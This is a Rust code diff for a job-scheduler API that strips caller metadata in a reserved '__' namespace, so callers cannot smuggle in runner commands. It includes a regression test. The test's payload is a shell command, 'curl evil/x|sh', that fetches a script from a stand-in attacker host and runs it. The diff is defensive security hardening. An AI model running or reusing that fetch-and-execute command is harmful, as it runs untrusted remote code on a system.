@@ -295,12 +295,30 @@ pub async fn handle_create(
             tags.push(trimmed.to_string());
         }
     }
+    // Strip caller metadata in the reserved `__` namespace before it is
+    // persisted. Stored job metadata is not handed to the scheduler today
+    // (`job_config_from_definition` drops it), but `job_config_from_job_def`
+    // does preserve it — so a stored `__runner_exec` / `__require` /
+    // `__max_concurrent` would turn into runner-executed input the moment
+    // those metadata are wired through. Filter at the ingress, like
+    // `POST /v1/trigger` does, so the namespace stays scheduler-owned
+    // regardless of what a later loader change does with the column.
+    let mut metadata = req.metadata;
+    let dropped = croniq_config::compile::strip_reserved_metadata_map(&mut metadata);
+    for key in &dropped {
+        tracing::debug!(
+            job_key = %req.job_key,
+            key = %key,
+            "create job: ignoring caller metadata key in reserved `__` namespace"
+        );
+    }
+
     let job = JobDefinition {
         job_key: req.job_key,
         description: req.description,
         assigned_runner_id: req.assigned_runner_id,
         is_active: true,
-        metadata: req.metadata,
+        metadata,
         created_at: now,
         updated_at: now,
         timeout: req.timeout,
@@ -373,6 +391,9 @@ pub async fn handle_update(
     if let Some(v) = obj.get("dead_letter_replay_max_age") {
         job.dead_letter_replay_max_age = v.as_str().map(|s| s.to_string());
     }
+    // Note: `metadata` is deliberately not patchable here — the reserved `__`
+    // namespace is scheduler-owned (see `handle_create`). If metadata patching
+    // is ever added, it must run `strip_reserved_metadata_map` first.
     if let Some(v) = obj.get("tags") {
         let mut out: Vec<String> = Vec::new();
         if let Some(arr) = v.as_array() {
@@ -542,7 +563,9 @@ pub async fn handle_register(
         .list_triggers(Some(&req.job_key))
         .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
 
-    // Create or update job definition
+    // Create or update job definition. `RegisterJobRequest` carries no
+    // metadata field on purpose: registration must not be able to seed the
+    // reserved `__` namespace (see `handle_create`).
     let job_def = JobDefinition {
         job_key: req.job_key.clone(),
         description: req.description.clone(),
@@ -1154,6 +1177,70 @@ mod tests {
             .as_object()
             .unwrap();
         assert!(row.get("suppressed_by").is_none());
+    }
+
+    /// POST a JSON body and return (status, parsed body).
+    async fn post_json(
+        app: axum::Router,
+        uri: &str,
+        body: serde_json::Value,
+    ) -> (u16, serde_json::Value) {
+        let resp = app
+            .oneshot(
+                Request::builder()
+                    .method("POST")
+                    .uri(uri)
+                    .header("content-type", "application/json")
+                    .body(Body::from(body.to_string()))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        let status = resp.status().as_u16();
+        let bytes = resp.into_body().collect().await.unwrap().to_bytes();
+        let json = serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null);
+        (status, json)
+    }
+
+    #[tokio::test]
+    async fn create_job_strips_reserved_metadata_namespace() {
+        // The `__` namespace is scheduler-owned: `__runner_exec` is what the
+        // shell runner spawns, `__require` / `__max_concurrent` drive routing
+        // and the concurrency guard. A `jobs:write` caller must not be able to
+        // persist those onto a stored job definition, even though the loader
+        // drops stored metadata on the way to the scheduler today.
+        use croniq_config::compile::RUNNER_EXEC_METADATA_KEY;
+
+        let store = make_store();
+        let state = make_state(vec![], Arc::clone(&store));
+
+        let (status, body) = post_json(
+            server_router(state),
+            "/v1/jobs",
+            serde_json::json!({
+                "job_key": "api:created",
+                "metadata": {
+                    RUNNER_EXEC_METADATA_KEY: "{\"kind\":\"shell\",\"command\":\"curl evil/x|sh\"}",
+                    "__max_concurrent": "999",
+                    "env": "staging"
+                }
+            }),
+        )
+        .await;
+
+        assert_eq!(status, 201);
+        assert!(body["metadata"].get(RUNNER_EXEC_METADATA_KEY).is_none());
+        assert!(body["metadata"].get("__max_concurrent").is_none());
+        assert_eq!(body["metadata"]["env"], "staging");
+
+        // And nothing reserved made it into the persisted row either.
+        let stored = store
+            .get_job_definition("api:created")
+            .unwrap()
+            .expect("job should be stored");
+        assert!(!stored.metadata.contains_key(RUNNER_EXEC_METADATA_KEY));
+        assert!(!stored.metadata.contains_key("__max_concurrent"));
+        assert_eq!(stored.metadata["env"], "staging");
     }
 
     #[tokio::test]
